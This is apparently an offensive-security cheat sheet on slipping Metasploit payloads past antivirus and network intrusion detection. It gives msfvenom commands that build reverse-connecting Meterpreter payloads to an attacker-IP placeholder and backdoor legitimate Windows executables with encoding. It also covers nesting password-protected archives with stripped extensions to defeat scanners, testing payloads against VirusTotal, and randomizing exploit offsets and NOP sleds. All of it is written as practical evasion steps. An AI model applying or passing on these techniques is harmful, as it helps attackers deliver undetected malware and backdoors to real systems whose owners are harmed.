## Methodology

1. If network-level IDS/IPS blocks standard Meterpreter traffic: Leverage MSF6 AES-encrypted tunnels or pivot to DNS exfiltration if outbound rules are restricted to specific services.
2. If host-based AV flags standalone payloads: Embed shellcode into legitimate templates using `msfvenom` or wrap the file in password-protected archives to prevent signature scanning.
3. If static analysis identifies common exploit patterns: Implement randomization in exploit code via offset switches and eliminate identifiable NOP sleds.
4. If detection persists after encoding: Utilize packers or double-nested password-protected archives with extension stripping to bypass engine depth limits.

---

## Network Traffic Evasion

Outbound connections are being flagged by IDS/IPS or blocked by strict firewall rulesets despite valid payload delivery.

Use the default MSF6 Meterpreter to encrypt communication and bypass network-based signatures

```
msfvenom <PAYLOAD_TYPE> LHOST=<ATTACK_IP> LPORT=<PORT> --platform windows -f exe -o <FILE_PATH>
```

> ⚠️ Gap: The source mentions DNS exfiltration as a bypass for strict IP-based rules but does not provide the specific Metasploit commands or modules to implement it.

**Gotchas** **Sender IP flagging** will kill the connection regardless of encryption if the firewall utilizes strict address-based rulesets.

## Executable Backdooring

Host-based AV nukes standalone payloads immediately upon disk write or execution.

Inject payload into a legitimate application to blend with known code signatures

```
msfvenom <PAYLOAD_TYPE> LHOST=<ATTACK_IP> LPORT=<PORT> -k -x <FILE_PATH_TO_TEMPLATE> -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_PATH> -i 5
```

**Dangerous / misconfigured settings**

- Omitting the `-k` flag: This **kills original application functionality**, making the compromise obvious to the user.

**Gotchas** **CLI Execution** of a backdoored template will pop a separate window for the payload that remains visible until the session is terminated.

## Archive Evasion

Static scanners are successfully identifying encoded payloads or backdoored executables during transfer.

Create a password-protected archive to prevent AV engines from scanning the internal file content

```
rar a <ARCHIVE_PATH> -p <PAYLOAD_PATH>
```

Strip extensions and double-nest archives to further degrade scanner visibility

```
mv <ARCHIVE_NAME>.rar <NEW_NAME>
rar a <FINAL_ARCHIVE>.rar -p <NEW_NAME>
```

**Edge cases**

- If the target environment has automated archive inspection: **Password-protected archives** often trigger high-severity notifications in AV dashboards because they cannot be scanned.

**Gotchas** **Manual inspection** by a SOC analyst is the primary failure condition for this technique as password-locked files are inherently suspicious.

## Detection Verification

Verifying if a payload variant is burnt before deploying on a target system.

Check the payload against multiple AV engines using the VirusTotal API

```
msf-virustotal -k <API_KEY> -f <FILE_PATH>
```

**Gotchas** **API License agreements** mean uploading a sample gives VirusTotal the right to distribute it to AV vendors, potentially burning your custom payload for future use.

## Exploit Code Randomization

IDS/IPS identifies the exploit attempt during the buffer overflow stage due to static signatures.

Add variation to exploit patterns to break signature matches for well-known buffers

```
'Targets' => [ [ '<TARGET_VERSION>', { 'Ret' => <HASH>, 'Offset' => <INT> } ], ],
```

**Gotchas** **Standard NOP sleds** are heavily fingerprinted; failing to replace them with randomized data will likely trigger an alert even if the buffer itself is randomized.